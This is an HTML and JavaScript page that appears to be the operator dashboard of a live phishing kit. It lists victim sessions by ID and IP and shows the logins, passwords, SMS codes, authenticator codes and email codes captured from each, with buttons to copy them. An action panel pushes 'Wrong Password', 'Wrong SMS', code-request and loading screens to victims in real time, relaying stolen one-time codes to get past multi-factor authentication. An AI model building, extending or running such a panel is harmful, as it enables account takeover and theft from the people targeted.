<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard (patched)</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      background-color: black;
      color: white;
    }
    .dashboard-wrapper {
      display: flex;
      width: 100vw;
      height: 100vh;
    }
    #sessions-container {
      width: 33.333vw;
      overflow-y: auto;
      padding: 10px;
      box-sizing: border-box;
    }
    #session-details-panel {
      width: 33.333vw;
      display: none;
      border: 1px solid #ccc;
      padding: 10px;
      box-sizing: border-box;
      overflow: auto;
    }
    #extra-panel {
      width: 33.333vw;
      border: 1px solid #ccc;
      padding: 10px;
      box-sizing: border-box;
      overflow: auto;
    }
    #session-details-panel .session-box {
      transform: scale(2);
      transform-origin: top left;
    }
    .session-box {
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 10px;
      margin: 10px 0;
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 100%;
      box-sizing: border-box;
      cursor: pointer;
      min-height: 80px;
    }
    .session-box.selected {
      background-color: lightblue;
      color: black;
    }
    .session-info {
      display: flex;
      align-items: center;
      flex-grow: 1;
    }
    .status-indicator {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      margin-right: 8px;
    }
    .status-online { background-color: green; }
    .status-offline { background-color: red; }
    .delete-btn {
      padding: 4px 8px;
      border: none;
      background: #e74c3c;
      color: white;
      border-radius: 4px;
      cursor: pointer;
    }
    #session-details-panel .session-info {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }
    #session-details-panel .session-info > * {
      margin-bottom: 10px;
    }
    #session-details-panel .session-box {
      width: 50%;
    }
    .action-btn {
      padding: 8px 12px;
      border: none;
      color: white;
      border-radius: 4px;
      cursor: pointer;
      margin: 5px;
      font-size: 14px;
      transition: background-color 0.15s ease, box-shadow 0.15s ease;
    }
    .action-btn:hover {
      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
      filter: brightness(1.1);
    }
    .action-btn:active { 
      transform: translateY(1px);
      box-shadow: 0 1px 2px rgba(0,0,0,0.3);
    }
    .btn-android { background-color: #4CAF50; }
    .btn-iphone { background-color: #2196F3; }
    .btn-sms { background-color: #FF9800; color: black; }
    .btn-gauth { background-color: #9C27B0; }
    .btn-phone { background-color: #607D8B; }
    .btn-email { background-color: #FF5722; color: black; }
    .btn-loading { background-color: #795548; }
    .btn-wrong { background-color: #f44336; color: black; }
    .action-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <h1>Admin Dashboard</h1>
  <div class="dashboard-wrapper">
    <div id="sessions-container"></div>
    <div id="session-details-panel"></div>
    <div id="extra-panel"></div>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();

    // --- Helpers: normalization + safe localStorage access (client-only) ---
    function normalizeId(x) {
      return String(x === undefined || x === null ? '' : x).trim().toLowerCase();
    }
    function safeGetRaw(key) {
      try { return localStorage.getItem(key); } catch (e) { return null; }
    }
    function safeSetRaw(key, val) {
      try { localStorage.setItem(key, val); return true; }
      catch (e) { console.error('localStorage.setItem failed', key, e); return false; }
    }

    function getDeletedSessionsArray() {
      try {
        const raw = safeGetRaw('deletedSessions');
        if (!raw) return window.__deletedSessionsFallback || [];
        const parsed = JSON.parse(raw);
        if (!Array.isArray(parsed)) return window.__deletedSessionsFallback || [];
        return parsed.map(normalizeId);
      } catch (e) {
        return window.__deletedSessionsFallback || [];
      }
    }

    function getDeletedSessionsSet() { return new Set(getDeletedSessionsArray()); }

    function addDeletedSession(id) {
      const sid = normalizeId(id);
      const arr = getDeletedSessionsArray();
      if (!arr.includes(sid)) {
        arr.push(sid);
        if (!safeSetRaw('deletedSessions', JSON.stringify(arr))) {
          window.__deletedSessionsFallback = arr;
          showToast('Could not persist deletion (localStorage unavailable).');
        } else {
          window.__deletedSessionsFallback = arr;
        }
      }
    }

    function removeDeletedSession(id) {
      const sid = normalizeId(id);
      const arr = getDeletedSessionsArray().filter(existing => existing !== sid);
      if (!safeSetRaw('deletedSessions', JSON.stringify(arr))) {
        window.__deletedSessionsFallback = arr;
      } else {
        window.__deletedSessionsFallback = arr;
      }
    }

    // --- Persist dashboardSessionID so refreshes use same dashboard ---
    let dashboardSessionID = safeGetRaw('dashboardSessionID');
    if (!dashboardSessionID) {
      dashboardSessionID = prompt("Enter dashboard sessionID:") || "dashboard_" + Math.random().toString(36).substring(2, 8);
      safeSetRaw('dashboardSessionID', dashboardSessionID);
    }

    // Join the dashboard session (we emit after we've set dashboardSessionID)
    socket.emit('dashboard-join', { sessionID: dashboardSessionID });

    let currentDetailSession = null;
    const sessionsData = {};

    // Load persisted sessions but filter out locally deleted ones (client-only)
    (function() {
      const raw = safeGetRaw('dashboardSessions');
      if (raw) {
        try {
          const parsed = JSON.parse(raw);
          const deleted = new Set(getDeletedSessionsArray());
          Object.keys(parsed).forEach(k => {
            const nk = normalizeId(k);
            if (!deleted.has(nk)) sessionsData[nk] = parsed[k];
          });
        } catch (e) {
          console.error('Could not parse persisted sessions:', e);
        }
      }
    })();

    function saveSessionData() {
      try {
        safeSetRaw('dashboardSessions', JSON.stringify(sessionsData));
      } catch (e) {
        console.error('saveSessionData failed', e);
      }
    }

    function createSessionBox(id, ip) {
      const sid = normalizeId(id);

      // If the session is marked deleted locally, bail out immediately
      const deletedSet = getDeletedSessionsSet();
      if (deletedSet.has(sid)) return null;

      // keep internal storage consistent using normalized key
     if (sessionsData[sid]) {
  sessionsData[sid].ip = ip;
} else {
  sessionsData[sid] = { ip, identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
}
const data = sessionsData[sid];


      const box = document.createElement('div');
      box.className = 'session-box';
      box.id = `session-${sid}`;

      const info = document.createElement('div');
      info.className = 'session-info';

      const statusDot = document.createElement('span');
      statusDot.className = 'status-indicator ' + (data.status === 'online' ? 'status-online' : 'status-offline');
      statusDot.title = data.status;

      const text = document.createElement('span');
      text.textContent = `ID: ${sid} | IP: ${data.ip}`;

      const idSpan = document.createElement('span');
      idSpan.style.marginLeft = '10px';
      idSpan.textContent = 'Identifier: ';
      const idValue = document.createElement('span');
      idValue.id = `identifier-${sid}`;
      idValue.textContent = data.identifier;
      idSpan.appendChild(idValue);

      info.appendChild(statusDot);
      info.appendChild(text);
      info.appendChild(idSpan);

      const del = document.createElement('button');
      del.className = 'delete-btn';
      del.textContent = 'Delete';
      del.addEventListener('click', e => {
        e.stopPropagation();

        // remove DOM & persisted session data
        const boxEl = document.getElementById(`session-${sid}`);
        if (boxEl) boxEl.remove();

        if (sessionsData[sid]) delete sessionsData[sid];

        // mark deleted locally (normalized)
        addDeletedSession(sid);
        saveSessionData();

        // don't re-open it after refresh
        const last = safeGetRaw('lastDetailSession');
        if (last && normalizeId(last) === sid) safeSetRaw('lastDetailSession', '');

        // inform server (left as-is Ã¢â‚¬" deletion remains client-side)
        socket.emit('dashboard-delete-session', { dashboardID: dashboardSessionID, sessionID: sid });

        if (currentDetailSession === sid) {
          document.getElementById('session-details-panel').style.display = 'none';
          const extra = document.getElementById('extra-panel');
          extra.innerHTML = '';
          extra.style.display = 'none';
          currentDetailSession = null;
        }
      });

      box.addEventListener('click', () => openDetail(sid));
      box.appendChild(info);
      box.appendChild(del);
      return box;
    }

    function buildDetailPanel(id) {
      const panel = document.getElementById('session-details-panel');
      panel.innerHTML = '';
      const data = sessionsData[id];
      if (!data) return;

      const detailBox = document.createElement('div');
      detailBox.className = 'session-box';

      const info = document.createElement('div');
      info.className = 'session-info';

      const statusDot = document.createElement('span');
      statusDot.className = 'status-indicator ' + (data.status === 'online' ? 'status-online' : 'status-offline');

      const text = document.createElement('span');
      text.textContent = `ID: ${id} | IP: ${data.ip}`;

      const headerRow = document.createElement('div');
      headerRow.style.display = 'flex';
      headerRow.style.alignItems = 'center';
      headerRow.appendChild(statusDot);
      headerRow.appendChild(text);
      info.appendChild(headerRow);

      const fields = [
        { label: 'Identifier', key: 'identifier' },
        { label: 'Password', key: 'password' },
        { label: 'SMS', key: 'sms' },
        { label: 'Gauth', key: 'gauth' },
        { label: 'Email Code', key: 'email-code' }      ];

      fields.forEach(field => {
        const wrapper = document.createElement('div');
        wrapper.style.display = 'flex';
        wrapper.style.alignItems = 'center';
        wrapper.style.marginBottom = '10px';

        const btn = document.createElement('button');
        btn.textContent = `${field.label}:`;
        btn.style.marginLeft = '10px';
        btn.title = 'Click to copy';
        btn.addEventListener('click', () => {
          navigator.clipboard.writeText(data[field.key]);
          showToast(`${field.label} copied`);
        });

        const value = document.createElement('span');
        value.textContent = data[field.key];
        value.style.marginLeft = '10px';

        wrapper.appendChild(btn);
        wrapper.appendChild(value);
        info.appendChild(wrapper);
      });

      detailBox.appendChild(info);
      panel.appendChild(detailBox);
      panel.style.display = 'block';
    }

    function buildExtraPanel(id) {
      const extra = document.getElementById('extra-panel');
      extra.innerHTML = '';
      extra.style.display = 'block';

      const title = document.createElement('h3');
      title.textContent = 'Action Panel';
      extra.appendChild(title);

      const actionGrid = document.createElement('div');
      actionGrid.className = 'action-grid';

      const actions = [
        { name: 'SMS', class: 'btn-sms', action: 'sms' },
        { name: 'Wrong SMS', class: 'btn-wrong', action: 'wrong_sms' },
        { name: 'Wrong Password', class: 'btn-wrong', action: 'wrong_password' },
        { name: 'Gauth', class: 'btn-gauth', action: 'gauth' },
        { name: 'Wrong Gauth', class: 'btn-wrong', action: 'wrong_gauth' },
        { name: 'Email Code', class: 'btn-email', action: 'email_code' },
        { name: 'Wrong Email Code', class: 'btn-wrong', action: 'wrong_email_code' },
        { name: 'Loading', class: 'btn-loading', action: 'loading' }
      ];

      actions.forEach(action => {
        const btn = document.createElement('button');
        btn.textContent = action.name;
        btn.className = `action-btn ${action.class}`;
        btn.addEventListener('click', () => {
          socket.emit('dashboard-action', { sessionID: id, buttonName: action.action, value: action.name });
          showToast(`${action.name} sent`);
        });
        actionGrid.appendChild(btn);
      });

      extra.appendChild(actionGrid);
    }

    function openDetail(id) {
      const sid = normalizeId(id);

      // Do not open details for locally-deleted sessions
      if (getDeletedSessionsSet().has(sid)) {
        const el = document.getElementById(`session-${sid}`);
        if (el) el.classList.remove('selected');
        return;
      }

      document.querySelectorAll('.session-box.selected').forEach(el => el.classList.remove('selected'));
      const small = document.getElementById(`session-${sid}`);
      if (small) small.classList.add('selected');

      currentDetailSession = sid;
      socket.emit('request-session-history', sid);
      safeSetRaw('lastDetailSession', sid);
      buildDetailPanel(sid);
      buildExtraPanel(sid);
    }

    function showToast(message) {
      const toast = document.createElement('div');
      toast.textContent = message;
      Object.assign(toast.style, {
        position: 'fixed',
        top: '20px',
        left: '50%',
        transform: 'translateX(-50%)',
        background: 'rgba(52,152,219,0.95)',
        color: '#fff',
        padding: '8px 14px',
        borderRadius: '4px',
        fontSize: '20px',
        opacity: '1',
        zIndex: '9999',
        transition: 'opacity 3s ease-out'
      });
      document.body.appendChild(toast);
      requestAnimationFrame(() => { toast.style.opacity = '0'; });
      setTimeout(() => toast.remove(), 3000);
    }

    const dataHandlers = {
      'client-identifier': 'identifier',
      'client-password': 'password',
      'client-sms': 'sms',
      'client-gauth': 'gauth',
      'client-phone-number': 'phoneNumber',
      'client-email-code': 'email-code'
    };

    // --- Socket handlers: normalize incoming IDs and honor deletedSessions set (client-only) ---
   socket.on('session-list', list => {
  const container = document.getElementById('sessions-container');
  container.innerHTML = '';

  const deletedSet = getDeletedSessionsSet();

   // Normalize IDs for quick lookup
  const onlineSet = new Set(list.map(({ sessionID }) => normalizeId(sessionID)));

  // Step 1: update sessionsData with online sessions from server
  list.forEach(({ sessionID, ip }) => {
    const sid = normalizeId(sessionID);
    if (deletedSet.has(sid)) return;

    if (!sessionsData[sid]) {
      sessionsData[sid] = { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
    } else {
      sessionsData[sid].ip = ip;
      sessionsData[sid].status = 'online';
    }
  });

  // Step 2: mark any known session NOT in the list as offline
  Object.keys(sessionsData).forEach(sid => {
    if (!onlineSet.has(sid)) {
      sessionsData[sid].status = 'offline';
    }
  });

  // Step 3: render all known (non-deleted) sessions
  Object.entries(sessionsData).forEach(([sid, data]) => {
    if (deletedSet.has(sid)) return;
    const sessionBox = createSessionBox(sid, data.ip);
    if (sessionBox) container.appendChild(sessionBox);
  });


  saveSessionData();

  const lastRaw = safeGetRaw('lastDetailSession');
  const last = lastRaw ? normalizeId(lastRaw) : null;
  if (last && !deletedSet.has(last)) openDetail(last);
});


    socket.on('client-connected', ({ sessionID, ip }) => {
      const sid = normalizeId(sessionID);
      if (getDeletedSessionsSet().has(sid)) return; // guard

      sessionsData[sid] = sessionsData[sid] || { ip, identifier: '', password: '', status: 'online', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
      sessionsData[sid].status = 'online';
      sessionsData[sid].ip = ip;
      const existing = document.getElementById(`session-${sid}`);
      if (!existing) {
        const sessionBox = createSessionBox(sid, ip);
        if (sessionBox) {
          document.getElementById('sessions-container').appendChild(sessionBox);
        }
      } else {
        const dot = existing.querySelector('.status-indicator');
        if (dot) dot.className = 'status-indicator status-online';
      }
      if (currentDetailSession === sid) buildDetailPanel(sid);
      saveSessionData();
    });

    socket.on('client-disconnected', ({ sessionID }) => {
      const sid = normalizeId(sessionID);
      if (getDeletedSessionsSet().has(sid)) return; // guard

      if (sessionsData[sid]) {
        sessionsData[sid].status = 'offline';
        const existing = document.getElementById(`session-${sid}`);
        if (existing) {
          const dot = existing.querySelector('.status-indicator');
          if (dot) dot.className = 'status-indicator status-offline';
        }
        if (currentDetailSession === sid) buildDetailPanel(sid);
        saveSessionData();
      }
    });

    Object.entries(dataHandlers).forEach(([eventName, key]) => {
      socket.on(eventName, payload => {
        const sid = normalizeId(payload.sessionID || payload.sessionId || payload.session);
        if (getDeletedSessionsSet().has(sid)) return; // skip updates for deleted sessions

        const value = payload[key];
        if (sessionsData[sid]) {
          sessionsData[sid][key] = value;
          const smallVal = document.getElementById(`${key}-${sid}`);
          if (smallVal) smallVal.textContent = value;
          if (currentDetailSession === sid) buildDetailPanel(sid);
          saveSessionData();
        } else {
          // If the session doesn't exist yet, create a minimal entry (but only if not deleted)
          sessionsData[sid] = { ip: payload.ip || '', identifier: '', password: '', status: 'offline', sms: '', gauth: '', phoneNumber: '', emailCode: '' };
          sessionsData[sid][key] = value;
          saveSessionData();
        }
      });
    });

    socket.on('session-history', ({ sessionID, events }) => {
      const sid = normalizeId(sessionID);
      if (getDeletedSessionsSet().has(sid)) return;

      if (sessionsData[sid]) {
        events.forEach(evt => {
          if (dataHandlers[`client-${evt.type}`]) {
            sessionsData[sid][dataHandlers[`client-${evt.type}`]] = evt.data;
          }
        });
        if (currentDetailSession === sid) {
          buildDetailPanel(sid);
          buildExtraPanel(sid);
        }
        saveSessionData();
      }
    });

    // optional: listen for server ack/un-delete if you implement it server-side
    socket.on('dashboard-delete-ack', ({ dashboardID, sessionID }) => {
      // server told us it's recorded Ã¢â‚¬" keep local state consistent (no-op here)
      // Could display a toast: showToast(`Deleted ${sessionID} on server`);
    });

  </script>
</body>
</html>